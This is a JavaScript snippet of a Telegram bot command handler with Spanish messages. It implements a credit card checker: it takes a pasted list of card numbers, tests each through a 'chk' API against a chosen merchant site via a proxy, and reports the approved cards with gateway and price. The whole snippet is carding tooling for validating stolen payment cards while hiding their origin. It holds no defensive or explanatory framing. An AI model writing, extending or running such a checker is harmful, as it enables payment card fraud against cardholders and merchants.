bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.activeSite || !data.activeProxy) {
    return bot.sendMessage(chatId, '❌ Selecciona site y proxy activos');
  }

  const input = match[1].trim();
  if (!input) {
    return bot.sendMessage(chatId, '❌ Envía tarjetas después del comando');
  }

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  let approved = 0;
  let declined = 0;

  const progressMsg = await bot.sendMessage(
    chatId,
    `⏳ 0/${ccs.length}`
  );

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    const cc = ccs[i];

    const r = await callChkAPI({
      site: data.activeSite,
      cc: cc,
      proxy: data.activeProxy
    });

    if (r.approved) {
      approved++;
      await bot.sendMessage(
        chatId,
`━━━━━━━━━━━━━━
💳 ${cc}
🏪 ${r.gateway}
💰 ${r.price}
✅ APPROVED`
      );
    } else {
      declined++;
    }

    await bot.editMessageText(
      `⏳ ${i + 1}/${ccs.length}
✅ ${approved} ❌ ${declined}`,
      {
        chat_id: chatId,
        message_id: progressMsg.message_id
      }
    );
  }

  running[chatId] = false;

  bot.sendMessage(
    chatId,
`✅ Finalizado
Aprobadas: ${approved}
Rechazadas: ${declined}`
  );
});
